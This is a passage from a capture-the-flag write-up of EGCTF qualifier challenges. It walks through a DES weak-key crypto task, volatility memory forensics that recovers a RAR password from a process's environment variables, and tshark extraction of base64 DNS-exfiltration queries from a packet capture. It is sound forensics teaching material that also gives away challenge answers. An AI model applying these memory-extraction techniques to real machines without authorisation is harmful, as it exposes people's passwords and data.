X.0.F.....&amp;.[M..</span><br><span class="line">00000050: 199c c222 2a41 2176 2ea0 ebf9 2499 edfd  ...&quot;*A!v....$...</span><br><span class="line">00000060: 2e04 3876 5c47 d039 aa28 b073 a34b 14c5  ..8v\G.9.(.s.K..</span><br><span class="line">00000070: 7b8e efad 7ed6 cde0 de4c 7bc1 2b0a 8f71  &#123;...~....L&#123;.+..q</span><br><span class="line">00000080: 1c4f cde0 77d1 7c84 edeb 2c15 3e06 d484  .O..w.|...,.&gt;...</span><br><span class="line">00000090: 42ad cc83 1db5 5dd5 520a 0a42 7965       B.....].R..Bye</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies#</span><br></pre></td></tr></table></figure><p>I opened the file in <code>vi</code> and removed <code>Name: Here is your personalized message:</code> and <code>Bye</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies# vi out.1</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies# xxd out.1 </span><br><span class="line">00000000: b44c 384f 0f40 19e0 6583 4d63 a3f9 87c7  .L8O.@..e.Mc....</span><br><span class="line">00000010: 8a01 95eb f94e 3458 1330 c046 c6a4 80df  .....N4X.0.F....</span><br><span class="line">00000020: 8326 0c5b 4dda b819 9cc2 222a 4121 762e  .&amp;.[M.....&quot;*A!v.</span><br><span class="line">00000030: a0eb f924 99ed fd2e 0438 765c 47d0 39aa  ...$.....8v\G.9.</span><br><span class="line">00000040: 28b0 73a3 4b14 c57b 8eef ad7e d6cd e0de  (.s.K..&#123;...~....</span><br><span class="line">00000050: 4c7b c12b 0a8f 711c 4fcd e077 d17c 84ed  L&#123;.+..q.O..w.|..</span><br><span class="line">00000060: eb2c 153e 06d4 8442 adcc 831d b55d d552  .,.&gt;...B.....].R</span><br><span class="line">00000070: 0a0a                                     ..</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies#</span><br></pre></td></tr></table></figure><p>Then I sent the encrypted message as an input, and I successfully got back the decrypted message, that’s when I knew that my approach wasn’t intended because it wants the decryption key as the flag:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies# cat out.1 | nc 167.71.93.117 9000</span><br><span class="line">Name: Here is your personalized message: 1</span><br><span class="line"> Well done, now submit the key in hex format, for example, if the key is &#39;Winter&#39; submit EGCTF&#123;57696e746572&#125;  m&gt;eMcǊN4X0FƤ߃&amp;</span><br><span class="line">                                                                                                                            [Mڸ&quot;*A!v.$.8v\G9(sK&#123;~L&#123;+</span><br><span class="line">qOw|,&gt;ԄB̃]R</span><br><span class="line"></span><br><span class="line">Byeroot@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;crypto&#x2F;DES-amies#</span><br></pre></td></tr></table></figure><p>The hint said <code>Strong key!</code>, so it’s probably a weak one, and <code>DES</code> is known for some weak keys. I searched for weak <code>DES</code> keys and found <a href="https://en.wikipedia.org/wiki/Weak_key" target="_blank" rel="noopener">this Wikipedia page</a>. I used <a href="http://des.online-domain-tools.com/" target="_blank" rel="noopener">des.online-domain-tools.com</a> and started trying some of the keys, <code>0xFEFEFEFEFEFEFEFE</code> worked:<br><img src="/images/ctfs/egctf-qual/20.png" alt=""></p><h2 id="Forensics-Data-Leakage"><a href="#Forensics-Data-Leakage" class="headerlink" title="Forensics: Data Leakage"></a>Forensics: Data Leakage</h2><h3 id="Challenge-Description-7"><a href="#Challenge-Description-7" class="headerlink" title="Challenge Description:"></a>Challenge Description:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">We acquired this memory image from the computer of the main suspect in corporate espionage case. Could you help us find what had been leaked?</span><br><span class="line"></span><br><span class="line">flag: EGCTF&#123;md5_hex_lowercase&#125;</span><br></pre></td></tr></table></figure><h3 id="Solution-7"><a href="#Solution-7" class="headerlink" title="Solution:"></a>Solution:</h3><p>We’re given a memory image called <code>memdump.mem</code>.<br>First thing I did was to check the image info (I used <code>volatility</code>):</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage# volatility -f .&#x2F;memdump.mem imageinfo</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">INFO    : volatility.debug    : Determining profile based on KDBG search...</span><br><span class="line">          Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86)</span><br><span class="line">                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)</span><br><span class="line">                     AS Layer2 : FileAddressSpace (&#x2F;root&#x2F;Desktop&#x2F;eg-ctf-quals&#x2F;forensics&#x2F;dataleakage&#x2F;memdump.mem)</span><br><span class="line">                      PAE type : PAE</span><br><span class="line">                           DTB : 0x31c000L</span><br><span class="line">                          KDBG : 0x80544ce0L</span><br><span class="line">          Number of Processors : 1</span><br><span class="line">     Image Type (Service Pack) : 2</span><br><span class="line">                KPCR for CPU 0 : 0xffdff000L</span><br><span class="line">             KUSER_SHARED_DATA : 0xffdf0000L</span><br><span class="line">           Image date and time : 2019-11-05 09:22:13 UTC+0000</span><br><span class="line">     Image local date and time : 2019-11-05 11:22:13 +0200</span><br><span class="line"></span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage#</span><br></pre></td></tr></table></figure><p>Then I checked the processes:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage# volatility -f .&#x2F;memdump.mem --profile&#x3D;WinXPSP2x86 psscan</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Offset(P)          Name                PID   PPID PDB        Time created                   Time exited                   </span><br><span class="line">------------------ ---------------- ------ ------ ---------- ------------------------------ ------------------------------</span><br><span class="line">0x000000000164bda0 svchost.exe         972    676 0x08600100 2019-11-05 09:20:17 UTC+0000</span><br><span class="line">0x000000000164cda0 svchost.exe         912    676 0x086000e0 2019-11-05 09:20:17 UTC+0000</span><br><span class="line">0x000000000165b230 svchost.exe        1220    676 0x08600160 2019-11-05 09:20:17 UTC+0000</span><br><span class="line">0x0000000001664390 7zFM.exe           1144   1520 0x08600300 2019-11-05 09:21:53 UTC+0000</span><br><span class="line">0x00000000016ba020 smss.exe            540      4 0x08600020 2019-11-05 09:20:14 UTC+0000</span><br><span class="line">0x0000000001763680 alg.exe            1336    676 0x08600180 2019-11-05 09:20:45 UTC+0000</span><br><span class="line">0x0000000001777658 vmtoolsd.exe        444    676 0x08600220 2019-11-05 09:20:45 UTC+0000</span><br><span class="line">0x000000000178e440 winlogon.exe        632    540 0x08600060 2019-11-05 09:20:16 UTC+0000</span><br><span class="line">0x00000000017eba78 VGAuthService.e     256    676 0x08600200 2019-11-05 09:20:37 UTC+0000</span><br><span class="line">0x00000000018044b8 explorer.exe       1520   1488 0x086001c0 2019-11-05 09:20:19 UTC+0000</span><br><span class="line">0x000000000181c3e8 csrss.exe           604    540 0x08600040 2019-11-05 09:20:15 UTC+0000</span><br><span class="line">0x0000000001838c10 lsass.exe           688    632 0x086000a0 2019-11-05 09:20:16 UTC+0000</span><br><span class="line">0x00000000018413e0 wuauclt.exe        1880   1112 0x086002c0 2019-11-05 09:21:30 UTC+0000</span><br><span class="line">0x0000000001854140 svchost.exe        1160    676 0x08600140 2019-11-05 09:20:17 UTC+0000</span><br><span class="line">0x000000000189c2c8 WinRAR.exe         1308   1520 0x086002e0 2019-11-05 09:21:46 UTC+0000</span><br><span class="line">0x00000000018f64a0 rundll32.exe       1356   1520 0x08600260 2019-11-05 09:20:45 UTC+0000</span><br><span class="line">0x000000000197d620 wscntfy.exe        1460   1112 0x086002a0 2019-11-05 09:21:45 UTC+0000</span><br><span class="line">0x00000000019a65b0 svchost.exe        1112    676 0x08600120 2019-11-05 09:20:17 UTC+0000</span><br><span class="line">0x00000000019b4020 spoolsv.exe        1676    676 0x086001e0 2019-11-05 09:20:19 UTC+0000</span><br><span class="line">0x0000000001a16980 svchost.exe        2024    676 0x086001a0 2019-11-05 09:20:37 UTC+0000</span><br><span class="line">0x0000000001a18da0 wmiprvse.exe        740    912 0x08600240 2019-11-05 09:20:45 UTC+0000</span><br><span class="line">0x0000000001a97da0 vmacthlp.exe        896    676 0x086000c0 2019-11-05 09:20:17 UTC+0000</span><br><span class="line">0x0000000001ab4da0 FTK Imager.exe      592   1520 0x08600320 2019-11-05 09:21:59 UTC+0000</span><br><span class="line">0x0000000001b0ad10 services.exe        676    632 0x08600080 2019-11-05 09:20:16 UTC+0000</span><br><span class="line">0x0000000001b17808 vmtoolsd.exe       1496   1520 0x08600280 2019-11-05 09:20:46 UTC+0000</span><br><span class="line">0x0000000001bcb830 System                4      0 0x0031c000</span><br><span class="line">0x0000000002e9b440 winlogon.exe        632    540 0x08600060 2019-11-05 09:20:16 UTC+0000</span><br><span class="line">0x00000000035c5c10 lsass.exe           688    632 0x086000a0 2019-11-05 09:20:16 UTC+0000</span><br><span class="line">0x00000000035f0390 7zFM.exe           1144   1520 0x08600300 2019-11-05 09:21:53 UTC+0000</span><br><span class="line">0x00000000038b0680 alg.exe            1336    676 0x08600180 2019-11-05 09:20:45 UTC+0000</span><br><span class="line">0x0000000008cd14b8 explorer.exe       1520   1488 0x086001c0 2019-11-05 09:20:19 UTC+0000</span><br><span class="line">0x0000000008da9da0 wmiprvse.exe        740    912 0x08600240 2019-11-05 09:20:45 UTC+0000</span><br><span class="line">0x0000000008f02020 spoolsv.exe        1676    676 0x086001e0 2019-11-05 09:20:19 UTC+0000</span><br><span class="line">0x000000000908b620 wscntfy.exe        1460   1112 0x086002a0 2019-11-05 09:21:45 UTC+0000</span><br><span class="line">0x00000000090c6da0 FTK Imager.exe      592   1520 0x08600320 2019-11-05 09:21:59 UTC+0000</span><br><span class="line">0x00000000091ded10 services.exe        676    632 0x08600080 2019-11-05 09:20:16 UTC+0000</span><br><span class="line">0x000000000920e3e0 wuauclt.exe        1880   1112 0x086002c0 2019-11-05 09:21:30 UTC+0000</span><br><span class="line">0x00000000092e7230 svchost.exe        1220    676 0x08600160 2019-11-05 09:20:17 UTC+0000</span><br><span class="line">0x00000000092e8da0 vmacthlp.exe        896    676 0x086000c0 2019-11-05 09:20:17 UTC+0000</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage#</span><br></pre></td></tr></table></figure><p>And I dumped the files:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage# mkdir files</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage# volatility -f .&#x2F;memdump.mem --profile&#x3D;WinXPSP2x86 dumpfiles -D .&#x2F;files&#x2F;</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">DataSectionObject 0x81862510   4      \Device\HarddiskVolume1\WINDOWS\system32\config\SECURITY</span><br><span class="line">SharedCacheMap 0x81862510   4      \Device\HarddiskVolume1\WINDOWS\system32\config\SECURITY</span><br><span class="line">DataSectionObject 0x814ba320   4      \Device\HarddiskVolume1\WINDOWS\system32\config\software</span><br><span class="line">---</span><br><span class="line">ImageSectionObject 0x8163b950   592    \Device\HarddiskVolume1\WINDOWS\system32\msvcr71.dll</span><br><span class="line">DataSectionObject 0x8163b950   592    \Device\HarddiskVolume1\WINDOWS\system32\msvcr71.dll</span><br><span class="line">ImageSectionObject 0x8181eb78   592    \Device\HarddiskVolume1\WINDOWS\system32\mshtml.dll</span><br><span class="line">DataSectionObject 0x8181eb78   592    \Device\HarddiskVolume1\WINDOWS\system32\mshtml.dll</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage#</span><br></pre></td></tr></table></figure><p>I ran the <code>file</code> command on all the dumped files and found 2 <code>RAR</code> archives:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage# cd files&#x2F;</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage&#x2F;files# file *</span><br><span class="line">file.1112.0x8144bae8.img:  PE32 executable (DLL) (GUI) Intel 80386, for MS Windows</span><br><span class="line">file.1112.0x81463a10.img:  PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">file.1112.0x814646e0.img:  PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">---</span><br><span class="line">file.1144.0x8147e6c8.dat:  RAR archive data, v5</span><br><span class="line">file.1144.0x81583d98.vacb: RAR archive data, v5</span><br><span class="line">---</span><br><span class="line">file.972.0x8183a6e0.img:   PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">file.972.0x8183aae8.img:   PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">file.972.0x8183af30.img:   PE32 executable (DLL) (console) Intel 80386, for MS Windows</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage&#x2F;files#</span><br></pre></td></tr></table></figure><p>Both of them had an image called <code>flag.png</code> and both of them were password protected:<br><img src="/images/ctfs/egctf-qual/21.png" alt=""></p><p><img src="/images/ctfs/egctf-qual/22.png" alt=""><br>Earlier when I ran <code>psscan</code> there was a <code>WinRAR</code> process running (<code>PID</code> : 1308 ): </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage# volatility -f .&#x2F;memdump.mem --profile&#x3D;WinXPSP2x86 psscan</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Offset(P)          Name                PID   PPID PDB        Time created                   Time exited                   </span><br><span class="line">------------------ ---------------- ------ ------ ---------- ------------------------------ ------------------------------</span><br><span class="line">---</span><br><span class="line">0x000000000189c2c8 WinRAR.exe         1308   1520 0x086002e0 2019-11-05 09:21:46 UTC+0000</span><br><span class="line">---</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage#</span><br></pre></td></tr></table></figure><p>I checked the environment variables of that process and found the password there:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage# volatility -f .&#x2F;memdump.mem --profile&#x3D;WinXPSP2x86 envars -p 1308</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">Pid      Process              Block      Variable                       Value</span><br><span class="line">-------- -------------------- ---------- ------------------------------ -----</span><br><span class="line">    1308 WinRAR.exe           0x00010000 ALLUSERSPROFILE                C:\Documents and Settings\All Users</span><br><span class="line">    1308 WinRAR.exe           0x00010000 APPDATA                        C:\Documents and Settings\Administrator\Application Data</span><br><span class="line">    1308 WinRAR.exe           0x00010000 CLIENTNAME                     Console</span><br><span class="line">    1308 WinRAR.exe           0x00010000 CommonProgramFiles             C:\Program Files\Common Files</span><br><span class="line">    1308 WinRAR.exe           0x00010000 COMPUTERNAME                   EGCTF-FEDB3D835</span><br><span class="line">    1308 WinRAR.exe           0x00010000 ComSpec                        C:\WINDOWS\system32\cmd.exe</span><br><span class="line">    1308 WinRAR.exe           0x00010000 FP_NO_HOST_CHECK               NO</span><br><span class="line">    1308 WinRAR.exe           0x00010000 HOMEDRIVE                      C:</span><br><span class="line">    1308 WinRAR.exe           0x00010000 HOMEPATH                       \Documents and Settings\Administrator</span><br><span class="line">    1308 WinRAR.exe           0x00010000 LOGONSERVER                    \\EGCTF-FEDB3D835</span><br><span class="line">    1308 WinRAR.exe           0x00010000 NUMBER_OF_PROCESSORS           1</span><br><span class="line">    1308 WinRAR.exe           0x00010000 OS                             Windows_NT</span><br><span class="line">    1308 WinRAR.exe           0x00010000 PASSWORD                       th!s!sg00d</span><br><span class="line">    1308 WinRAR.exe           0x00010000 Path                           C:\Program Files\WinRAR;C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem</span><br><span class="line">    1308 WinRAR.exe           0x00010000 PATHEXT                        .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH</span><br><span class="line">    1308 WinRAR.exe           0x00010000 PROCESSOR_ARCHITECTURE         x86</span><br><span class="line">    1308 WinRAR.exe           0x00010000 PROCESSOR_IDENTIFIER           x86 Family 6 Model 158 Stepping 9, GenuineIntel</span><br><span class="line">    1308 WinRAR.exe           0x00010000 PROCESSOR_LEVEL                6</span><br><span class="line">    1308 WinRAR.exe           0x00010000 PROCESSOR_REVISION             9e09</span><br><span class="line">    1308 WinRAR.exe           0x00010000 ProgramFiles                   C:\Program Files</span><br><span class="line">    1308 WinRAR.exe           0x00010000 SESSIONNAME                    Console</span><br><span class="line">    1308 WinRAR.exe           0x00010000 SystemDrive                    C:</span><br><span class="line">    1308 WinRAR.exe           0x00010000 SystemRoot                     C:\WINDOWS</span><br><span class="line">    1308 WinRAR.exe           0x00010000 TEMP                           C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp</span><br><span class="line">    1308 WinRAR.exe           0x00010000 TMP                            C:\DOCUME~1\ADMINI~1\LOCALS~1\Temp</span><br><span class="line">    1308 WinRAR.exe           0x00010000 USERDOMAIN                     EGCTF-FEDB3D835</span><br><span class="line">    1308 WinRAR.exe           0x00010000 USERNAME                       Administrator</span><br><span class="line">    1308 WinRAR.exe           0x00010000 USERPROFILE                    C:\Documents and Settings\Administrator</span><br><span class="line">    1308 WinRAR.exe           0x00010000 windir                         C:\WINDOWS</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;data-leakage#</span><br></pre></td></tr></table></figure><p><img src="/images/ctfs/egctf-qual/23.png" alt=""><br><code>flag.png</code>:<br><img src="/images/ctfs/egctf-qual/24.png" alt=""></p><h2 id="Forensics-Oh-My-Salary"><a href="#Forensics-Oh-My-Salary" class="headerlink" title="Forensics: Oh My Salary!"></a>Forensics: Oh My Salary!</h2><h3 id="Challenge-Description-8"><a href="#Challenge-Description-8" class="headerlink" title="Challenge Description:"></a>Challenge Description:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List of employees with their salaries had been leaked. Here is the traffic captured from the network. It may contain the leaked data. Can you help?</span><br><span class="line"></span><br><span class="line">Flag Format: EGCTF&#123;md5_hex_lowercase&#125;</span><br></pre></td></tr></table></figure><h3 id="Solution-8"><a href="#Solution-8" class="headerlink" title="Solution:"></a>Solution:</h3><p>We’re given a <code>pcapng</code> file called <code>salary_traffic.pcapng</code>, by looking at the capture in <code>wireshark</code> and sorting the packets according to their protocol I noticed a bunch of weird <code>DNS</code> queries:<br><img src="/images/ctfs/egctf-qual/25.png" alt=""><br>All of them were looking up the same domain <code>example.test</code> with different <code>base-64</code> encoded strings as subdomains.<br>I used <code>tshark</code> to extract all of these <code>DNS</code> queries and I saved them into a file: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary# tshark -r .&#x2F;salary_traffic.pcapng -T fields -e ip.src -e dns.qry.name &quot;dns.flags.response eq 0 and dns.qry.name contains example.test&quot;</span><br><span class="line">Running as user &quot;root&quot; and group &quot;root&quot;. This could be dangerous.</span><br><span class="line">192.168.125.145 N3q8ryccAATIxWF+.example.test</span><br><span class="line">192.168.125.145 8AoAAAAAAAB6AAAA.example.test</span><br><span class="line">192.168.125.145 AAAAANY3kCg6AWnJ.example.test</span><br><span class="line">192.168.125.145 Ic9uESaH5GfcRZ9l.example.test</span><br><span class="line">192.168.125.145 KuuWZ&#x2F;LK8Hnb\nmS+.example.test</span><br><span class="line">---</span><br><span class="line">192.168.125.145 GQAYQB0AGEALgB0A.example.test</span><br><span class="line">192.168.125.145 HgAdAAAABQKAQDQb.example.test</span><br><span class="line">192.168.125.145 KHeApTVARUGAQAgA.example.test</span><br><span class="line">192.168.125.145 AAAAAA&#x3D;\n.example.test</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary# tshark -r .&#x2F;salary_traffic.pcapng -T fields -e ip.src -e dns.qry.name &quot;dns.flags.response eq 0 and dns.qry.name contains example.test&quot; &gt; out.txt</span><br><span class="line">Running as user &quot;root&quot; and group &quot;root&quot;. This could be dangerous.</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary#</span><br></pre></td></tr></table></figure><p>Then by using a text editor I removed the ip address, <code>.example.test</code> and the new lines:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;EGCTF-Quals&#x2F;forensics&#x2F;Oh-My-Salary# cat out.txt </span><br><span class="line">N3q8ryccAATIxWF+8AoAAAAAAAB6AAAAAAAAANY3kCg6AWnJIc9uESaH5GfcRZ9lKuuWZ&#x2F;LK8Hnb\nmS+E+XYT7fZ3Nfq4zT1z+BAI9wL3lV5Jsiv&#x2F;n2EvBE4vc1+PHg&#x2F;L6QN9AfNG4KihNI8kLHOy02Cz\nJQzLFdT0Zei85AS3CZGZeRQBS+v&#x2F;U5HYv7AU6K67BU5vI+WQn3cVlc8WqbXm9bpqkwnvncy&#x2F;xsTG\nzoMY03OBXLJUU&#x2F;2jFsF2DOPI+uP6a3t8k5n2NaJGiRF0PsRXk2blrpTc1IFaIYI3ArmjWTuLVxYD\nohLpRppUt4+S4iOMX4AYXrzPNUL4zwEisXj8zAh4RB+E+y&#x2F;8nmXXzh0Pvn4aQAfw3ZsM4TWyQLVa\nUosmZu9rUICrUlRcskmZDD25WukXczXGe6lPwzDozKXmfgErTIPv7vJr57nDJffROYagZoAuW2eb\n3OVaeEfPnESeJHKULhXhfFtbqfVUOeU8TUVcym+47hEg8pTasXdPwbsRfjS+HpAJSAZ2pMtVPhXL\nO2AKQBpw70DoQpgHtk84S+hkbE4RALliYcoEPpQSP9GSSFlOV5wQiD9Xv&#x2F;GTdQ+Cvx+PUYYfTAlI\nfyNvE4KgrnV03LqhFN7jKJSPImvz6BlPp&#x2F;wyu2ar+3qjxFfnivSz8Vzmp+fA69gO6xI1WyMT7SfL\nF0PmjtVSR052JmKwvbrfTrFqaef4PfW5fOedyz4&#x2F;trqE7+xBHqwKqQf8dFUra87uec&#x2F;VruMJKbuO\nH0sJSCaURkVBFBre9grg0mlXKmxu88ovko5LOLq+S1A1e7DALF6zI9NzEIMp61r0ZISAC5RBir+3\nIk5xI0vJN+yEgFUzDCYkPJG7F8&#x2F;76K+m&#x2F;vgas20WxZTAj+6fpZRVQazxvq+f+ZvrXoPnF5eFKvqF\nqlPHOFn1L1urXts61aFTg+4epVK9JxfPx&#x2F;6q2iA6Gnw2LHGG4ZkviC7FiOd+GF3ysRd25SOuXUit\njkjUmRQoatL1RVQMbyp9KBkyRnjFUs9OWwHOkbYgl4REJ&#x2F;qGd7HMW4h8FeklkQ5Mjv1Sb&#x2F;fje9RA\n&#x2F;KxC+KzXoRqexkSBSoxc48zOTbhuAxyDMG5tw1i5SNoLDqYU+u1MkYzUFv5G7cxrhSnE925Qt49t\nvVYboHky0jbgilGqU3j4tRQS2nSf3AskOrW4Fef2VyZVSJ1QKECoJg6cn7sXgG&#x2F;5eZvczXAAzsIk\nyf&#x2F;Beb4&#x2F;IFc3EIn0L8inS2Ds5rXUq0EyHaqyXwmR2gi1H8T4i9AHsB4HKFD91ThW&#x2F;agKel8K2BvW\n0Oawglav&#x2F;RZx4VtOIAkz&#x2F;j8wvnE6AvA87mbC+bWSUmpE&#x2F;3m9FuzG6aeMFrPvFJef6C8tLR5VhXWA\nh7zh52kaDTGlFDLnHmUUl99NmKhMqD6rinO6lMVUN1XnqEnftcAtfMeTGtte3iB5&#x2F;hwziuiGcekZ\nFKxMLhAM1w5OI0XwbMBvMcgDRMcGS7mLLeVqUrrJpv0&#x2F;AZ50ilbsop5vamOxFslt70rsJrQI4K7r\norGwlzC8oLqKxlfToV69j2bgSutxjZeJ6eIYhWkoWRWZ0qaaRdM1gDOvr6Swuq2Bz3e+UB7QAfc&#x2F;\n7S8HL8X6SFa14WkQlXbv63ACkhAbFmDL664u8MMS6yjukmmBwWILaSjn70HLTSbYYFJFDvsSX4C4\nKxPXprYvHpZYRN7QJ8Z6wh0+8WLGkexFgQ+5gp38ITKw2ZbEpUhyZ7g56pzXzcZ4Ao26imPCPPCM\nkxEjQNb25GazGW1ZeFRBuChEDRGhyHpVBrjHAVEOGHslXDlfiYCBxx4zHAbzl1bY2+JcYPSQysbP\n9Azm8dyjhwFxLTLi2oijgKt6ebc6yqGkCXYw7Lz35Sv9RlvjxhUDuomszKEx4igGFrfATGZflZWe\neSs&#x2F;oNSX2hIB3Z+Q&#x2F;CmF7&#x2F;iTtL+1&#x2F;3ppRNfclN6cf6xwkKQDay9+8LW87vHYDdUkyDGebhJVgUEU\nhkVqh84+y